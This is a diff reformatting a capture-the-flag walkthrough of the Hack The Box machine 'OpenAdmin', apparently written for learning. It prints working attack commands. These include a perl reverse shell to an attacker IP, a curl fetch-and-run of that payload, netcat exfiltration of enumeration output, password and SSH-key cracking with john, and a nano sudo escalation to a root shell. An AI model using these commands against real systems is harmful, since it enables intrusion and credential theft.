@@ -5,14 +5,14 @@ This box can be quite a pain for beginners to do, but the troubleshooting part i
 
 **Tools: nmap, gobuster, netcat, LinEnum/LinPEAS, ssh2john, john.**
 
-We begin with the nmap scan:
-> nmap -Pn -sV -sC --min-rate=10000 -p- 10.10.10.171
+We begin with the nmap scan:  
+`nmap -Pn -sV -sC --min-rate=10000 -p- 10.10.10.171`
 
 ![OpenAdmin](../Images/htb_openadmin_2.png)
 
 With port 80 open, we can take a look at the webpage, and meanwhile run a fuzzer with gobuster:  
-(Try a lower value [like 100, or use the default 10] for the -t flag if any error occurs)
-> gobuster dir -u http://10.10.10.171/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300
+(Try a lower value [like 100, or use the default 10] for the -t flag if any error occurs)  
+`gobuster dir -u http://10.10.10.171/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300`
 
 ![OpenAdmin](../Images/htb_openadmin_3.png)
 
@@ -39,7 +39,7 @@ while true;do
 done
 ```
 
-Now we can simply run the shell script:
+Now we can simply run the shell script:  
 
 ```
 chmod +x 47691.sh
@@ -56,13 +56,13 @@ First of all, put a perl reverse shell code inside a file, let's call it revs.pl
 perl -e 'use Socket;$i="10.10.14.245";$p=16501;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-Next, start a python simple http server in the same folder of the perl file in your machine to send the exploit to the target:
-> python3 -m http.server 80
+Next, start a python simple http server in the same folder of the perl file in your machine to send the exploit to the target:  
+`python3 -m http.server 80`
 
-In another terminal window, start a netcat listening session:
-> nc -vnlp 16501
+In another terminal window, start a netcat listening session:  
+`nc -vnlp 16501`
 
-Now inside of the shell that we've got earlier with the exploit:
+Now inside of the shell that we've got earlier with the exploit:  
 
 ```
 curl 10.10.14.245/revs.pl > revs.pl (use your tun0 IP)
@@ -70,26 +70,32 @@ chmod 777 revs.pl (give the file permission to run)
 ./revs.pl (run the script)
 ```
 
-You'll get a shell in the netcat window, now we can finally spawn a fully interactive shell:
-> python3 -c 'import pty;pty.spawn("/bin/bash")'
+You'll get a shell in the netcat window, now we can finally spawn a fully interactive shell:  
+`python3 -c 'import pty;pty.spawn("/bin/bash")'`
 
 ![OpenAdmin](../Images/htb_openadmin_8.png)
 
 Now we need to enumerate the box.  
-This next step didn't give many good results, but I'll write it down because it was a bit of a pain, and I've learned a few new tricks. With LinPeas I couldn't get it to save the output to a file without breaking the results completely, so I decided to use LinEnum.
-> git clone https://github.com/rebootuser/LinEnum.git  
-> cd LinEnum  
+This next step didn't give many good results, but I'll write it down because it was a bit of a pain, and I've learned a few new tricks. With LinPeas I couldn't get it to save the output to a file without breaking the results completely, so I decided to use LinEnum.  
+```
+git clone https://github.com/rebootuser/LinEnum.git  
+cd LinEnum  
+```
 
-Start once again a python3 http server, and then curl the linenum.sh file to the target. After that, give the script permissions and run it:
-> chmod 777 linenum.sh  
-> ./linenum.sh -r result -e . -t
+Start once again a python3 http server, and then curl the linenum.sh file to the target. After that, give the script permissions and run it:  
+```
+chmod 777 linenum.sh  
+./linenum.sh -r result -e . -t
+```
 
-When it finishes, use netcat to send the file to your machine:
-> nc -q 5 -vnlp 9068 < result-16-07-21
+When it finishes, use netcat to send the file to your machine:  
+`nc -q 5 -vnlp 9068 < result-16-07-21`
 
-Then, in your machine, download the file through netcat and read it using 'less':
-> nc -v 10.10.10.171 9068 > result-16-07-21  
-> cat result-16-07-21 | less
+Then, in your machine, download the file through netcat and read it using 'less':  
+```
+nc -v 10.10.10.171 9068 > result-16-07-21  
+cat result-16-07-21 | less
+```
 
 ![OpenAdmin](../Images/htb_openadmin_9.png)
 
@@ -107,8 +113,8 @@ If we read the php files, we can see a hashed password (SHA512) in the index.php
 
 ![OpenAdmin](../Images/htb_openadmin_12.png)
 
-We can crack it with an online tool such as [Crackstation](https://crackstation.net/), but we can also use John - save the hash to a hash.txt file:
-> john hash.txt --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo
+We can crack it with an online tool such as [Crackstation](https://crackstation.net/), but we can also use John - save the hash to a hash.txt file:  
+`john hash.txt --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo`
 
 We'll get the password 'Revealed'. This is useful if you use the SSH port forwarding/tunneling technique to pwn this box, but I won't use that because I had some trouble with it, so this password won't have much use.  
 Now reading the main.php we can see the following:
@@ -121,37 +127,41 @@ I got stuck at this point and had to get some help. We could either run 'ss -lnp
 
 ![OpenAdmin](../Images/htb_openadmin_14.png)
 
-With this information, we could either create an SSH port forwarding/tunneling, or try to curl the main.php file:
-> curl 127.0.0.1:52846/main.php
+With this information, we could either create an SSH port forwarding/tunneling, or try to curl the main.php file:  
+`curl 127.0.0.1:52846/main.php`
 
 And we're lucky, because this works. We can save the key (I'm using its original filename):
 
 ![OpenAdmin](../Images/htb_openadmin_15.png)
 
-Now we can run ssh2john toconvert the key to a format that can be cracked with john: 
-> /usr/share/john/ssh2john.py id_rsa > hash  
-> john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Now we can run ssh2john toconvert the key to a format that can be cracked with john:  
+```
+/usr/share/john/ssh2john.py id_rsa > hash  
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
 ![OpenAdmin](../Images/htb_openadmin_16.png)
 
 The password we get is 'bloodninjas'.  
-Next up, we can use the ssh key and the password to access joanna's account through SSH:
-> chmod 600 id_rsa  
-> ssh -i id_rsa joanna@10.10.10.171
+Next up, we can use the ssh key and the password to access joanna's account through SSH:  
+```
+chmod 600 id_rsa  
+ssh -i id_rsa joanna@10.10.10.171
+```
 
 ![OpenAdmin](../Images/htb_openadmin_17.png)
 
 At joanna's home directory we can grab the user flag (user.txt).  
-The escalation of privileges is the easiest part of this box. We simply check what files joanna can run as root:
-> sudo -l
+The escalation of privileges is the easiest part of this box. We simply check what files joanna can run as root:  
+`sudo -l`
 
 ![OpenAdmin](../Images/htb_openadmin_18.png)
 
-And, based on the results, we can use a simple nano sudo privesc from [GTFObins](https://gtfobins.github.io/gtfobins/nano/#sudo):
-> sudo -u root /bin/nano /opt/priv
+And, based on the results, we can use a simple nano sudo privesc from [GTFObins](https://gtfobins.github.io/gtfobins/nano/#sudo):  
+`sudo -u root /bin/nano /opt/priv`
 
-Inside the nano file, first press Ctrl+R then Ctrl+X and then type the command to be executed:
-> reset; sh 1>&0 2>&0
+Inside the nano file, first press Ctrl+R then Ctrl+X and then type the command to be executed:  
+`reset; sh 1>&0 2>&0`
 
 Press enter and you'll be root. Now just grab the root flag at /root/root.txt and you're done!
 
